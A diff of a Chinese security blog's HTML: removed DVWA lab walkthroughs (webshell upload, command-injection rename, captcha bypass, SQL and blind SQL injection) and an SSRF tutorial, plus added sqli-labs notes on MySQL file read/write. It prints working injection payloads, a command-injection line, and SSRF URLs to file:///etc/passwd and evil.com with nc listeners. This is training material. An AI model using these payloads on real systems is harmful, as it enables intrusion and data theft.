-<h2 id="5-File-upload文件上传"><a href="#5-File-upload文件上传" class="headerlink" title="5.File upload文件上传"></a>5.File upload文件上传</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p><img src="/.com//c92f0ca2659de359b6dda9fdd58d23cd-20250425172053-9ya348y.png" alt="c92f0ca2659de359b6dda9fdd58d23cd"></p>
-<p>可以看到，没有任何限制，所以直接上传一个php后门文件即可</p>
-<p> 直接上传一句话木马，蚁剑链接即可</p>
-<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p> 可以看到，靶场对文件类型做了限制，只允许上传png、jpeg，并且检查</p>
-<p><img src="/.com//fd8bc231d15557db234ddd92e2d4a745-20250425172423-br5ll4y.png" alt="fd8bc231d15557db234ddd92e2d4a745"></p>
-<p>burp后台改后缀即可</p>
-<p>‍</p>
-<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p> 看源代码可以发现，不仅限制了文件类型，而且限制了大小，不能少于100kb</p>
-<p><img src="/.com//42a6ceb6367ab31ef8b9468d9d5c45fb-20250425172446-hhvsnf6.png" alt="42a6ceb6367ab31ef8b9468d9d5c45fb"></p>
-<p>可以上传一个图片马，打开cmd，输入以下命令：<code>copy post2.php/a + 111.png/b 66.png</code>​</p>
-<p><img src="/.com//549490ef5de7cd680ca26bd8f524f483-20250425172455-32a0xdu.png" alt="549490ef5de7cd680ca26bd8f524f483"></p>
-<p>此时已经上传成功，但不能利用</p>
-<p><img src="/.com//4a84d8fcccf0c77b894d775b47aa45cd-20250425172506-52ttghn.png" alt="4a84d8fcccf0c77b894d775b47aa45cd"></p>
-<p>在命令注入中输入127.0.0.1|| ren C:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\888.png 888.php</p>
-<p><img src="/.com//ccfc7557d167997fdc4dd98f505a1078-20250425172532-dnkw477.png" alt="ccfc7557d167997fdc4dd98f505a1078">此时发现，888.png已经被改名为888.php</p>
-<p>‍</p>
-<h2 id="6-insecure-captcha不安全的验证"><a href="#6-insecure-captcha不安全的验证" class="headerlink" title="6.insecure captcha不安全的验证"></a>6.insecure captcha不安全的验证</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><p> 本关是在第二步做验证，所以把step改为2就可以绕过验证</p>
-<p><img src="/.com//eabf443fe5d55d6af0739e5c7df2e765-20250425172652-x0th1hw.png" alt="eabf443fe5d55d6af0739e5c7df2e765"></p>
-<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p> 依旧抓包改包</p>
-<p><img src="/.com//3635ebcbdcf767c961b46cda65863f80-20250425172657-5hierei.png" alt="3635ebcbdcf767c961b46cda65863f80"></p>
-<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p><img src="/.com//490a93c21a9bd427fe3d29dea67d7efa-20250425172703-77m3kop.png" alt="490a93c21a9bd427fe3d29dea67d7efa"></p>
-<p>让通过验证的情况增加了一种。原先是只有验证码为真才能通过验证，现在新增“或者g-recaptcha-response且HTTP_USER_AGENT为特定内容”通过验证。</p>
-<p> 那直接用Burpsuite修改数据包</p>
-<p><img src="/.com//8601e5ee714e65e6521aaecea77fbe2d-20250425172708-5gq4swo.png" alt="8601e5ee714e65e6521aaecea77fbe2d"></p>
-<p>‍</p>
-<h2 id="7-SQL-injection-sql注入"><a href="#7-SQL-injection-sql注入" class="headerlink" title="7.SQL injection sql注入"></a>7.SQL injection sql注入</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><ol>
-<li>输入1+2，可以看到，并未输出3，所以可以判定是字符型注入</li>
-</ol>
-<p><img src="/.com//91a5a615ee0f8c4b9199dd8788cb79e2-20250425172821-gb4jvax.png" alt="91a5a615ee0f8c4b9199dd8788cb79e2"></p>
-<p>输入如下payload：’1 or 1=1’ ，可以看到有报错，所以一定存在sql注入</p>
-<p><img src="/.com//0ded62d0731c2502d756236e702834a6-20250425172828-2scjktq.png" alt="0ded62d0731c2502d756236e702834a6"></p>
-<p><img src="/.com//4fd521db8e735523d0a818882dce5597-20250425172831-e9o5jfm.png" alt="4fd521db8e735523d0a818882dce5597"></p>
-<p>使用order by判断字段数 1’ order by 2 #</p>
-<p><img src="/.com//a17effc3868eb93c474867f504fe2e02-20250425172838-0nbohx7.png" alt="a17effc3868eb93c474867f504fe2e02"></p>
-<p>1’ order by 3 #</p>
-<p><img src="/.com//3200280212d7dbbf9417cd5f46a177ce-20250425172844-yv8r8qc.png" alt="3200280212d7dbbf9417cd5f46a177ce"></p>
-<p>由此判断，他只有两个字段</p>
-<ol>
-<li>然后使用联合查询 1’ union select 1,2 # 获取回显位置</li>
-</ol>
-<p><img src="/.com//14b5a5a1f63d114e0c22f9649147a3fd-20250425172850-1pa3jj7.png" alt="14b5a5a1f63d114e0c22f9649147a3fd"></p>
-<p>在对应位置获取数据库名 1’ union select database(),2 #</p>
-<p><img src="/.com//5c64dd66f4fed0355fd501f7ce4768e7-20250425172856-izm3bma.png" alt="5c64dd66f4fed0355fd501f7ce4768e7"></p>
-<p>获取数据库所有表名 1’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #</p>
-<p><img src="/.com//60b5183c063b38ef89a35c0f06b11302-20250425172901-19j6jn0.png" alt="60b5183c063b38ef89a35c0f06b11302"></p>
-<pre><code>获取users字段名
+<h1 id="Less——7"><a href="#Less——7" class="headerlink" title="Less——7"></a>Less——7</h1><blockquote>
+<p>补充知识点</p>
+<p>​<code>show variables like &#39;%secure%&#39;;</code>​查看secure-file-priv当前的值，如果显示为NULL，则需要打开，：\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure file priv&#x3D;”&#x2F;”。</p>
+<p>而且要先设置secure_file_priv&#x3D;,如果它为空则可以指定任意目录，如果设置等于某个路径就只能在这个指定路径下，而它为NULL则禁止导入导出功能</p>
+<p>​<code>load_file()</code>​读取本地文件<code>select load_file(&#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7&#39;)</code>​</p>
+<p>​<code>into outfile</code>​写文件    用法：<code>select &#39;mysql is very good&#39; into outfile &#39;test1.txt&#39;;</code>​</p>
+<pre><code>				文件位置： 是在sql版本下的data文件中
 </code></pre>
-<p>1’ union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() #</p>
-<p><img src="/.com//9b28bb76146997ac3c1a0310c70c0290-20250425172911-y5kdd7j.png" alt="9b28bb76146997ac3c1a0310c70c0290"></p>
-<ol>
-<li>获取字段值</li>
-</ol>
-<p> 1’ union select password,user from users #</p>
-<p><img src="/.com//830ea6ebdea4a1cafbd68c3b1fc28c7d-20250425172925-6nzb1g3.png" alt="830ea6ebdea4a1cafbd68c3b1fc28c7d"></p>
-<p>现在已经拿到了用户和密码，但密码是加密的，可使用md5自行解密 <a target="_blank" rel="noopener" href="https://cmd5.com/" title="md5在线解密破解,md5解密加密">md5在线解密破解,md5解密加密</a></p>
+<p>我们要写到绝对位置那就，双反斜线是因为\t这种类型被转义掉了</p>
+<p>​<code>select &#39;a&#39; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\tsxt.txt&#39;；</code>​</p>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">！！！注意sql语句中\需要转译</span></p>
+</blockquote>
 <p>‍</p>
-<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><ol>
-<li>先选中1，抓一个包，然后发到重放模块，用于测试，可以修改参数，数字型注入</li>
-</ol>
-<p> id修改为1+1，出现报错</p>
-<p><img src="/.com//f290b11a4a46c412831d62057faa65c5-20250425173006-w7azyem.png" alt="f290b11a4a46c412831d62057faa65c5"></p>
-<p>使用order by判断字段数</p>
-<p><img src="/.com//f7080fe5b14c527ac83e957fa6f387af-20250425173025-p1mqx8c.png" alt="f7080fe5b14c527ac83e957fa6f387af"></p>
-<p><img src="/.com//7e576d86d507cb5fda0d514b7f339a7c-20250425173028-dvfygd6.png" alt="7e576d86d507cb5fda0d514b7f339a7c"></p>
-<p>输入联合查询语句</p>
-<p><img src="/.com//94c752d33768607b940ba5c088b8454c-20250425173035-pg461k1.png" alt="94c752d33768607b940ba5c088b8454c"></p>
-<p>剩余步骤同上</p>
-<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><p> 1.输入1’，发现报错</p>
-<p><img src="/.com//c3e7ddd980a483947e4df2376ac0d2ff-20250425173042-zcr3d58.png" alt="c3e7ddd980a483947e4df2376ac0d2ff"></p>
-<p>输入联合查询语句</p>
-<p><img src="/.com//1bfc929320387d76beafeb6597f52f71-20250425173052-250wxuk.png" alt="1bfc929320387d76beafeb6597f52f71"></p>
-<p>按上述步骤进行查询</p>
-<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p> 限制只能为数字   不存在注入</p>
-<p>‍</p>
-<h2 id="8-SQL-injection（blind）盲注"><a href="#8-SQL-injection（blind）盲注" class="headerlink" title="8.SQL injection（blind）盲注"></a>8.SQL injection（blind）盲注</h2><h3 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h3><ol>
-<li>输入 1’ and 1=1 # 可以看到 正常执行</li>
-</ol>
-<p><img src="/.com//34337217f9b95502cde5e73d522aba79-20250425173105-dwfpfwp.png" alt="34337217f9b95502cde5e73d522aba79"></p>
-<p>猜解开数据库长度1’ and length(database())=x #</p>
-<p><img src="/.com//751149ca4a1557d6985de8d258d2cf01-20250425173119-c3wcxww.png" alt="751149ca4a1557d6985de8d258d2cf01"></p>
-<p><img src="/.com//4b90b927976bd2e18252b41bdb1b5f48-20250425173123-ffmyd3b.png" alt="4b90b927976bd2e18252b41bdb1b5f48"></p>
-<p>用aascii猜解数据库名 1’ and ascii(substr(database(),1,1))=100 # 由此确定，第一位ascii是100，对比ascii表（<a target="_blank" rel="noopener" href="http://ascii.wjccx.com/" title="ASCII码对照表-完整ASCII码表-我就查查询">ASCII码对照表-完整ASCII码表-我就查查询</a>）可得 为d</p>
-<p><img src="/.com//43b0bc8b8ca471ba0126fe4f5f6a2a0e-20250425173156-3qawi2b.png" alt="43b0bc8b8ca471ba0126fe4f5f6a2a0e"></p>
-<ol>
-<li>和普通sql注入相同，依次查询库名表名字段名</li>
-</ol>
-<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><ol>
-<li>随意选择一个数，然后抓包</li>
-</ol>
-<p><img src="/.com//7ac45f64d1403222c82393a5b210906c-20250425173331-kchwbjb.png" alt="7ac45f64d1403222c82393a5b210906c"></p>
-<p>修改参数 1 and length(database())=4 #，根据布尔 盲注判断，，数据库名为4</p>
-<p><img src="/.com//a4553a678f1d6482e5fb8ce9841c3538-20250425173338-wyz18se.png" alt="a4553a678f1d6482e5fb8ce9841c3538"></p>
-<p>下面依旧使用sql语句进行查询，步骤同上</p>
-<p>‍</p>
-<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><ol>
-<li>1’ and 1=1 # 测试，发现成功执行</li>
-</ol>
-<p><img src="/.com//ca86f4d80df4b3feccbf28e4ccdaf857-20250425173346-utigrlz.png" alt="ca86f4d80df4b3feccbf28e4ccdaf857"></p>
-<p>盲注，测试数据库名长度 1’ and length(database())=4 #</p>
-<p><img src="/.com//31274efc2f2bde6b41b806798e997547-20250425173353-ae59gvt.png" alt="31274efc2f2bde6b41b806798e997547"></p>
-<p>接下来的步骤同上</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmaxy8gbd0001kg7kdooe1byb" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/SSRF/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
-<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
-<hr>
-<h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
-<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
-<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
-<hr>
-<h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
-<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
-<p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
-<p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
-<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
-<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
-</blockquote>
-<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
-<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
-<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
-<p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
-<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
-<p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
-<blockquote>
-<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
-</blockquote>
-<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
-<hr>
-<h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
-<p><strong>1、file_get_contents:</strong></p>
-<p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2、sockopen():</strong></p>
-<p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>3、curl_exec():</strong></p>
-<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意事项</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
-
-<p><strong>1、file</strong></p>
-<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
-<blockquote>
-<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
-</blockquote>
-<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
-<p><strong>2、dict</strong></p>
-<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>3、sftp</strong></p>
-<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>4、ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong></p>
-<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>5、tftp:&#x2F;&#x2F;</strong></p>
-<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>6、gopher:&#x2F;&#x2F;</strong></p>
-<p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
-<blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></blockquote>
-<hr>
-<h2 id="六、SSRF漏洞利用（危害）"><a href="#六、SSRF漏洞利用（危害）" class="headerlink" title="六、SSRF漏洞利用（危害）"></a>六、SSRF漏洞利用（危害）</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
-<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
-<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
-<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
-<p>5.利用file协议读取本地文件等。.</p>
-<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
-<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
-<hr>
-<h2 id="七、SSRF绕过方式"><a href="#七、SSRF绕过方式" class="headerlink" title="七、SSRF绕过方式"></a>七、SSRF绕过方式</h2><p><strong>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</strong></p>
-<p>一、常见的绕过方式</p>
-<p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
-<blockquote>
